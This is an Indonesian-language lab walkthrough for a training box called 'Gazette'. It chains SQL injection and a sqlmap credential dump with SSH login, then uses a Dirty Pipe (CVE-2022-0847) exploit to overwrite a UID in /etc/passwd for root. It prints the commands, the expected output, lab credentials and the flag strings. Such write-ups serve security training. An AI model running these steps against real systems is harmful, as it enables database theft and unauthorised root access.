# 03 — Pembahasan Detail Lab Gazette v2
## SQL Injection → Database Dump → SSH Editor → Dirty Pipe → Root

> Target pembaca: peserta baru yang perlu memahami dari mana nama database, tabel, credential, dan offset Dirty Pipe diperoleh.

---

## 1. Gambaran Besar

Alur lengkap Gazette:

```text
Recon web 8000
→ temukan endpoint /news/detail?id=1
→ validasi SQL Injection parameter id
→ sqlmap cari database
→ sqlmap cari tabel
→ sqlmap cari kolom
→ sqlmap dump credential
→ dapat editor:password123
→ SSH sebagai editor
→ cek kernel
→ siapkan Dirty Pipe PoC
→ cari offset UID editor di /etc/passwd
→ timpa UID 1001 menjadi 0000
→ su - editor
→ root
→ find flag
```

---

## 2. Data Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.121` |
| Web | `http://192.168.56.121:8000` |
| Endpoint rentan | `/news/detail?id=1` |
| Parameter rentan | `id` |
| DBMS | MySQL/MariaDB |
| Database | `gazette` |
| Tabel credential | `users` |
| Credential | `editor:password123` |
| User awal | `editor` |
| Privesc | Dirty Pipe / CVE-2022-0847 |
| File target | `/etc/passwd` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |

---

## 3. Fase 1 — Recon Web

### Command

```bash
TARGET="192.168.56.121"
WEB="http://192.168.56.121:8000"

nmap -Pn -sC -sV -p22,8000 "$TARGET"
```

### Output yang Diharapkan

```text
22/tcp   open ssh
8000/tcp open http
```

### Makna Output

Port `8000` adalah aplikasi web. Port `22` penting karena credential hasil SQLi dapat diuji sebagai SSH.

---

## 4. Fase 2 — Identifikasi Endpoint Rentan

Contoh URL aplikasi:

```text
http://192.168.56.121:8000/news/detail?id=1
```

Parameter yang diuji:

```text
id
```

### Baseline Manual

```bash
URL="http://192.168.56.121:8000/news/detail?id=1"

curl -i "$URL"
```

### Output Normal

```text
HTTP/1.1 200 OK
```

### Uji Boolean Sederhana

```bash
curl -i "http://192.168.56.121:8000/news/detail?id=1 AND 1=1"
curl -i "http://192.168.56.121:8000/news/detail?id=1 AND 1=2"
```

### Makna

Jika respons `1=1` dan `1=2` berbeda, ada indikasi SQL Injection. Untuk evidence lebih kuat, gunakan SQLMap.

---

## 5. Fase 3 — SQLMap Deteksi Injection

### Command

```bash
sqlmap \
  -u "$URL" \
  -p id \
  --batch \
  --technique=U
```

### Output Evidence

```text
Parameter: id (GET)
Type: UNION query
DBMS: MySQL/MariaDB
```

### Makna Output

Parameter `id` injectable. DBMS adalah MySQL/MariaDB. Sekarang enumerasi database bisa dilanjutkan.

---

## 6. Fase 4 — SQLMap Tahap 1: Cari Database

### Command

```bash
sqlmap -u "$URL" -p id --batch --dbs
```

### Output Evidence

```text
available databases
[*] gazette
[*] information_schema
```

### Makna Output

Nama database aplikasi adalah `gazette`. Jadi penggunaan `-D gazette` berasal dari output ini, bukan asumsi.

---

## 7. Fase 5 — SQLMap Tahap 2: Cari Tabel

### Command

```bash
sqlmap -u "$URL" -p id --batch \
  -D gazette \
  --tables
```

### Output Evidence

```text
Database: gazette
[1 table]
+-------+
| users |
+-------+
```

### Makna Output

Tabel `users` kemungkinan menyimpan credential.

---

## 8. Fase 6 — SQLMap Tahap 3: Cari Kolom

### Command

```bash
sqlmap -u "$URL" -p id --batch \
  -D gazette \
  -T users \
  --columns
```

### Output Contoh

```text
Database: gazette
Table: users
+----------+
| username |
| password |
+----------+
```

### Makna Output

Kolom `username` dan `password` adalah target dump.

---

## 9. Fase 7 — SQLMap Tahap 4: Dump Credential

### Command

```bash
sqlmap -u "$URL" -p id --batch \
  -D gazette \
  -T users \
  --dump
```

### Output Evidence

```text
Username : editor
Password : password123
```

### Makna Output

Credential aplikasi ditemukan. Karena SSH terbuka, uji credential reuse ke SSH.

---

## 10. Fase 8 — SSH sebagai Editor

### Command

```bash
ssh editor@192.168.56.121
```

Password:

```text
password123
```

### Validasi

```bash
id
whoami
hostname
pwd
```

### Output Evidence

```text
uid=1001(editor) gid=1001(editor)
editor
/home/editor
```

### Makna Output

Foothold lokal berhasil sebagai user `editor`. Dirty Pipe adalah local privilege escalation, jadi shell lokal diperlukan.

---

## 11. Fase 9 — Cek Sudo dan Kernel

### Command

```bash
sudo -l
uname -a
cat /proc/version
```

### Output Evidence

```text
editor tidak memiliki akses sudo
Linux 5.10.70-1
```

### Makna Output

Tidak ada jalur sudo. Kernel `5.10.70-1` menjadi petunjuk jalur Dirty Pipe pada lab.

---

## 12. Fase 10 — Menyiapkan Dirty Pipe PoC

### Tujuan

Membuat dan mengompilasi PoC yang akan menulis ke `/etc/passwd`.

### Buat Source Code

Simpan PoC sebagai:

```text
/home/editor/dirtypipe.c
```

Pada sesi latihan sebelumnya, source Dirty Pipe sudah disediakan sebagai lampiran kode. Untuk lesson ini, fokusnya adalah urutan penggunaan.

### Compile

```bash
cd /home/editor
gcc -O2 -Wall dirtypipe.c -o dirtypipe
```

### Validasi

```bash
ls -l dirtypipe
file dirtypipe
```

### Output yang Diharapkan

```text
-rwxr-xr-x 1 editor editor ... dirtypipe
dirtypipe: ELF 64-bit LSB executable
```

### Makna Output

Executable `dirtypipe` berhasil dibuat dan siap dijalankan.

---

## 13. Fase 11 — Cari Offset UID Editor

### Command

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

### Output Evidence

```text
2183:editor:x:1001:1001
```

### Hitung Offset UID

String:

```text
editor:x:1001:1001
```

UID `1001` dimulai setelah `editor:x:`.

```text
panjang "editor:x:" = 9
offset UID = 2183 + 9 = 2192
```

Visual:

```text
editor:x:1001:1001
         ^
         UID dimulai di sini
```

### Makna

Dirty Pipe butuh offset byte. Yang ditimpa adalah `1001`, bukan seluruh baris.

---

## 14. Fase 12 — Ubah UID Editor Menjadi 0000

### Command

```bash
./dirtypipe /etc/passwd 2192 0000
```

Jika hasil grep berbeda, ganti `2192` dengan offset aktual.

### Output Evidence

```text
Berhasil menulis 4 byte pada offset 2192
```

### Verifikasi

```bash
grep '^editor:' /etc/passwd
```

### Output

```text
editor:x:0000:1001::/home/editor:/bin/bash
```

### Mengapa `0000`?

Karena `1001` memiliki panjang 4 karakter. Pengganti harus sama panjang agar struktur `/etc/passwd` tidak bergeser.

---

## 15. Fase 13 — Root dengan `su - editor`

### Command

```bash
su - editor
```

Password:

```text
password123
```

### Validasi

```bash
id
whoami
```

### Output yang Diharapkan

```text
uid=0(root) gid=1001(editor)
root
```

### Makna Output

Sesi baru membaca `/etc/passwd` yang sudah dimodifikasi. User `editor` kini memiliki UID 0.

---

## 16. Fase 14 — Cari dan Baca Flag

### Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Output Contoh

```text
/root/FLAG.txt
/home/editor/FLAG.txt
```

```text
cat /root/FLAG.txt
FLAG{d1r7yp1p3_5pl1c35_7h3_r007}
cat /home/editor/FLAG.txt
FLAG{5ql1_l34k5_7h3_n3w5r00m_cr3d5}
```
### Baca Flag

```bash
cat /PATH/FLAG
```

---

## 17. Kesalahan Umum Gazette

| Masalah | Penyebab | Solusi |
|---|---|---|
| Langsung pakai `-D gazette` tanpa tahu asalnya | Tahap `--dbs` dilewati | Jalankan `sqlmap --dbs` dulu |
| Langsung dump tanpa tahu tabel | Tahap `--tables` dilewati | Jalankan `--tables`, lalu `--columns` |
| SSH gagal | Credential salah atau SSH tidak aktif | Cek `nmap -p22`, ulang dump |
| Dirty Pipe gagal | Offset salah | Ulang `grep -bo` dan hitung ulang |
| `su - editor` belum root | `/etc/passwd` belum berubah | Cek `grep '^editor:' /etc/passwd` |

---

## 18. Alur Hafalan Gazette

```text
nmap 22,8000
URL /news/detail?id=1
sqlmap -p id --technique=U
sqlmap --dbs → gazette
sqlmap -D gazette --tables → users
sqlmap -D gazette -T users --columns
sqlmap -D gazette -T users --dump → editor:password123
ssh editor
uname → 5.10.70-1
gcc dirtypipe.c
grep -bo editor:x:1001:1001
offset + 9
dirtypipe passwd OFFSET 0000
su - editor
root
find flag
cat flag
```
